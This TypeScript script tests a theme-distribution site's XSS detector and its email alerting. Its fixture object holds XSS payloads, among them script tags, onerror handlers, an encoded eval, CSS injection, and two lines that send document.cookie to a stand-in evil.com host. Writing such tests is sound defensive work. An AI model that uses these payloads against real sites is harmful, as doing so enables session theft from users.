/**
 * XSS Attack Simulation Script
 *
 * Simulates malicious theme data injection to test:
 * 1. XSS detection engine (security.ts regex patterns)
 * 2. Email alert delivery via QQ Mail (notifier.ts)
 *
 * Usage: npx tsx scripts/simulate-xss.ts
 */

import nodemailer from 'nodemailer';

// ── Fake XSS payloads mimicking real-world theme injection attacks ──

const MALICIOUS_THEME = {
  date: "2026-05-24",
  preset: "malicious-theme",
  presetName: "Free iPhone! <script>alert(document.cookie)</script>",
  author: "attacker<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
  available: 42,

  // XSS via custom CSS (expression / -moz-binding)
  customCss: `
    body { background: expression(alert('XSS')) }
    * { -moz-binding: url("http://evil.com/xss.xml#xss") }
    div { background: url(javascript:alert('stolen')) }
  `.trim(),

  // XSS via CSS variables
  cssVars: {
    "--title-font": 'Arial, sans-serif',
    "--bg-image": 'url("data:text/html,<script>alert(1)</script>")',
    "--content": '";}</style><script>alert("css-var-xss")</script><style>',
  },

  // XSS via extensions HTML
  extensions: [
    {
      name: "Malicious Widget",
      // <img onerror> + javascript: protocol
      html: '<div><img src=x onerror="alert(\'XSS\')"><a href="javascript:eval(atob(\'YWxlcnQoMSk=\'))">Click</a></div>',
      type: "widget",
    },
    {
      name: "Phishing Banner",
      // <iframe> + <script>
      html: '<iframe src="https://evil.com/phish"></iframe><script>new Image().src="https://evil.com/log?c="+document.cookie</script>',
      type: "banner",
    },
    {
      name: "Clean Widget",
      html: '<div class="safe">Normal content</div>',
      type: "widget",
    },
  ],

  // XSS in directory entries
  directory: [
    { name: "Normal Theme", author: "Alice" },
    { name: '<img src=x onerror=alert(1)>', author: '<script>evil()</script>' },
    { name: 'Safe Theme <b>bold</b>', author: 'Bob' },
    { name: '</textarea><script>alert(document.domain)</script>', author: 'Charlie' },
  ],
};

// ── XSS detection: same regex patterns from security.ts ──

const MALICIOUS_PATTERNS: RegExp[] = [
  /<script\b[^>]*>[\s\S]*?<\/script>/gi,
  /javascript\s*:/gi,
  /alert\s*\(/gi,
  /on\w+\s*=/gi,
  /document\.cookie/gi,
  /eval\s*\(/gi,
  /<iframe\b[^>]*>/gi,
  /expression\s*\(/gi,
  /-moz-binding/gi,
  /data\s*:\s*text\/html/gi,
  /<\/style/gi,
];

function scanValue(value: unknown, path: string, flagged: string[]): void {
  if (typeof value === 'string') {
    for (const pattern of MALICIOUS_PATTERNS) {
      if (pattern.test(value)) {
        flagged.push(`[${path}] ${pattern.source.slice(0, 60)} → ${value.slice(0, 80).replace(/\n/g, ' ')}`);
        break;
      }
    }
  } else if (Array.isArray(value)) {
    value.forEach((item, i) => scanValue(item, `${path}[${i}]`, flagged));
  } else if (value && typeof value === 'object') {
    for (const [k, v] of Object.entries(value as Record<string, unknown>)) {
      scanValue(v, `${path}.${k}`, flagged);
    }
  }
}

// ── Email sender (mirrors notifier.ts) ──

function sendAlertEmail(flagged: string[]): Promise<unknown> {
  const transporter = nodemailer.createTransport({
    host: 'smtp.qq.com',
    port: 465,
    secure: true,
    auth: {
      user: process.env.QQ_EMAIL_USER,
      pass: process.env.QQ_EMAIL_PASS,
    },
  });

  const flaggedList = flagged.map((f) => `<li style="margin:4px 0;font-family:monospace;font-size:13px;word-break:break-all;">${f}</li>`).join('');

  const html = `
<div style="font-family:-apple-system,sans-serif;max-width:600px;margin:0 auto;">
  <div style="background:#dc3545;padding:24px;border-radius:8px 8px 0 0;">
    <h1 style="color:#fff;margin:0;font-size:20px;">⚠️ ThemeDist Monitor — Security Breach Detected</h1>
  </div>
  <div style="background:#f8f9fa;padding:24px;border-radius:0 0 8px 8px;border:1px solid #e9ecef;">
    <table style="width:100%;border-collapse:collapse;table-layout:fixed;">
      <tr><td style="padding:8px 0;color:#666;width:80px;">Type</td><td style="padding:8px 0;font-weight:600;color:#dc3545;">⚠️ SECURITY_BREACH (XSS Attack Simulation)</td></tr>
      <tr><td style="padding:8px 0;color:#666;">Severity</td><td style="padding:8px 0;"><span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:4px;font-size:12px;">CRITICAL</span></td></tr>
      <tr><td style="padding:8px 0;color:#666;">Platform</td><td style="padding:8px 0;">both (Vercel + Netlify)</td></tr>
      <tr><td style="padding:8px 0;color:#666;">Message</td><td style="padding:8px 0;font-weight:600;">${flagged.length} malicious patterns detected in today's theme!</td></tr>
      <tr><td style="padding:8px 0;color:#666;">Time</td><td style="padding:8px 0;">${new Date().toLocaleString('zh-CN')}</td></tr>
    </table>
    <div style="margin-top:16px;padding:12px;background:#fff3cd;border-radius:6px;border:1px solid #ffc107;">
      <strong style="color:#856404;">Flagged Payloads:</strong>
      <ul style="margin:8px 0 0;padding-left:20px;color:#856404;">${flaggedList}</ul>
    </div>
    <div style="margin-top:16px;padding-top:12px;border-top:1px solid #e9ecef;font-size:12px;color:#999;">
      <p>Go to <a href="https://themedist-monitor.vercel.app" style="color:#0066cc;">Dashboard</a> for details.</p>
      <p>This is an automated alert. Do not reply.</p>
      <p style="margin-top:4px;font-style:italic;">— This is a simulated XSS attack for testing purposes.</p>
    </div>
  </div>
</div>`.trim();

  return transporter.sendMail({
    from: '"ThemeDist Monitor" <424635328@qq.com>',
    to: '424635328@qq.com',
    subject: `[ThemeDist Monitor] ⚠️ Security Breach — ${flagged.length} XSS payloads detected in theme data`,
    html,
  });
}

// ── Main ──

async function main() {
  console.log('╔══════════════════════════════════════════╗');
  console.log('║   XSS Attack Simulation — ThemeDist      ║');
  console.log('╚══════════════════════════════════════════╝\n');

  // Step 1: Scan the malicious payload
  console.log('━'.repeat(50));
  console.log('[1/3] Scanning malicious theme data...\n');
  const flagged: string[] = [];
  scanValue(MALICIOUS_THEME, 'root', flagged);

  if (flagged.length > 0) {
    console.log(`  🚨 DETECTED: ${flagged.length} malicious patterns found!\n`);
    for (const f of flagged) {
      console.log(`  • ${f}`);
    }
  } else {
    console.log('  ✅ No threats detected. (Something is wrong — payload should be flagged.)\n');
    process.exit(1);
  }

  // Step 2: Trigger email alert
  console.log(`\n${'━'.repeat(50)}`);
  console.log('[2/3] Sending email alert via QQ Mail...\n');

  if (!process.env.QQ_EMAIL_USER) {
    console.log('  ⚠️  QQ_EMAIL_USER not set. Loading from .env.local...');
    // dotenv not installed, but .env.local is Next.js convention
    // We'll rely on tsx running from the project root
    console.log('  Make sure .env.local has QQ_EMAIL_USER and QQ_EMAIL_PASS\n');
  }

  try {
    const info = await sendAlertEmail(flagged);
    console.log(`  ✅ Email sent successfully!`);
    console.log(`  Message ID: ${(info as any).messageId}`);
    console.log(`  To: 424635328@qq.com`);
  } catch (err) {
    console.error(`  ❌ Failed to send email: ${(err as Error).message}`);
    process.exit(1);
  }

  // Step 3: Summary
  console.log(`\n${'━'.repeat(50)}`);
  console.log('[3/3] Summary\n');
  console.log('  ┌────────────────────────────────────────┐');
  console.log('  │  Simulated Attack Type    │  XSS       │');
  console.log(`  │  Threats Detected         │  ${String(flagged.length).padEnd(10)} │`);
  console.log('  │  Alert Sent               │  ✅        │');
  console.log('  │  Recipient                │  QQ Mail   │');
  console.log('  └────────────────────────────────────────┘\n');
  console.log('👉 Please check 424635328@qq.com for the alert email.');
}

main();
